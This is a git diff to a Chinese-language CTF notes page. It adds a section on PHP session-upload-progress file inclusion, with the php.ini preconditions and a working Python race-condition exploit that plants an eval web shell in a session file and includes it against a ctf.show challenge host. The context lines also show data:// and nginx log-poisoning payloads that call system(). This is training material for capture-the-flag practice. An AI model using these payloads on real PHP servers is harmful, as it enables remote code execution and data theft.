@@ -23,6 +23,7 @@ comments: true
 - [9. GET/POST](#9-getpost)
 - [10. 命令执行](#10-命令执行)
 - [11. 文件包含](#11-文件包含)
+  - [11.1 php session文件包含](#111-php-session文件包含)
 
 
 ## 前言<br>
@@ -248,4 +249,53 @@ c=data://text/plain,<?php system("tac fl*g.php")?>
 //nginx的默认访问日志目录,随后在http请求的User-Agent写入代码
 /?file=/var/log/nginx/access.log
 User-Agent: <?php system('tac fl0g.php'); ?>
+```
+
+### 11.1 php session文件包含<br>
+前置条件<br>
+`php.ini`中的以下条件开启：<br>
+```
+session.upload_progress.enabled = on //enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；
+
+session.upload_progress.prefix = "upload_progress_" //将表示为session中的键名
+
+session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS" //当它出现在表单中，php将会报告上传进度，而且它的值可控！！！可用于写入代码
+
+session.save_path = /var/lib/php/sessions //session的存贮位置，默认还有一个 /tmp/目录
+```
+还有**以下情景二选一**:<br>
+```
+session.use_strict_mode = off //这个选项默认值为off，表示我们对Cookie中sessionid可控！！！
+// 我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。
+session.auto_start=On //的情况下，php在接收请求的时候会自动初始化session，不需要执行session_start()。但默认状态下，这个选项是默认关闭的。
+```
+
+```python
+#coding=utf-8
+import io
+import requests
+import threading
+sessid = 'wsxk'
+data = {"cmd":"system('cat fl0g.php');"}
+def write(session):
+    while event.wait():
+        f = io.BytesIO(b'a' * 1024 * 50)
+        resp = session.post( 'http://f0f3b3fe-3a1d-45f2-8e76-62d350530913.challenge.ctf.show/', data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'}, files={'file': ('wsxk.txt',f)}, cookies={'PHPSESSID': sessid} )
+
+def read(session):
+    while event.wait():
+        resp = session.post('http://f0f3b3fe-3a1d-45f2-8e76-62d350530913.challenge.ctf.show/?file=/tmp/sess_'+sessid,data=data)
+        if 'wsxk.txt' in resp.text:
+            print(resp.text)
+            event.clear()
+        else:
+            print("[+++++++++++++]retry")
+if __name__=="__main__":
+    event=threading.Event()
+    with requests.session() as session:
+        for i in range(1): 
+            threading.Thread(target=write,args=(session,)).start()
+        for i in range(1):
+            threading.Thread(target=read,args=(session,)).start()
+    event.set()
 ```
